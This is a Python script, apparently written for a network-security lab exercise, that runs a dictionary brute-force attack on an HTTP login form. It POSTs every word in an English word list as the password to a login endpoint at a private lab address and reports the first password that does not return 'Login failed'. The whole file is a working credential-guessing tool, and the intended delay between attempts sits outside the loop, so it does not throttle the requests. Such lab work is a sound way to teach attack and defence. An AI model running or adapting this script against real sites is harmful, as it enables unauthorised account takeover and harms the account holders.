#!/usr/bin/env python3
"""
crack_password uses requests to send layer 7 messages to brute force the website found from testing the IPs and ports in Part 2.
Attempts all the words in english_words
"""

import requests, time

# Configuration
TARGET_HOST = "192.168.60.2"
TARGET_PORT = 60
ID = "*"         # CHANGE THIS to your actual ID
DICTIONARY_FILE = "./english_words.txt"

def try_login(password):
    """
    Try to login with the given password, using requests
    """
    
    url = f"http://{TARGET_HOST}:{TARGET_PORT}/login" # login end point
    
    data = { # structure from WireShark
        "username" : ID,
        "password" : password,
    }
    
    try:
        response = requests.post(url, data=data, timeout=5)
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
        return None
    
def break_password():
    """
    Main function that tries each password from dictionary
    """
    print("=" * 70)
    print("HTTP POST PASSWORD CRACKER")
    print("=" * 70)
    print(f"\nTarget:     http://{TARGET_HOST}:{TARGET_PORT}/login")
    print(f"Username:   {ID}")
    print(f"Dictionary: {DICTIONARY_FILE}")
    print(f"Method:     POST (observed in Wireshark)")
    print("=" * 70)
    print()
    
    # 1. Reading in the dictionary file english_words.txt
    try:
        with open(DICTIONARY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"Loaded {len(passwords)} passwords\n")
    except FileNotFoundError:
        print(f"ERROR: File '{DICTIONARY_FILE}' not found!")
        return
    
    # 2. Starting password cracking:
    attempt = 0
    try:
        for password in passwords:
            attempt += 1
            print(f"\nTesting Password: {password}")
            
            # get a response
            response = try_login(password)
            
            # if it is nothing, continue
            if response is None:
                print(f"\nNo Response Using Password: {password}")
                continue
            
            print("Response:" + str(response))
            
            if "Login failed" not in response.text:
                print("\n" + "=" * 70)
                print("SUCCESS! PASSWORD FOUND!")
                print("=" * 70)
                print(f"Password:       {password}")
                print(f"Attempts:       {attempt}/{len(passwords)}")
                print(f"Response code:  {response.status_code}")
                print(f"Response size:  {len(response.text)} bytes")
                print("=" * 70)
                return
            else:
                print("Login Failed")
    
        time.sleep(0.5)
        
    except KeyboardInterrupt:
        print(f"\n\nStopped by user after {attempt} attempts")
        return

if __name__ == "__main__":
    print("BRUTE FORCING PASSWORDS")
    break_password()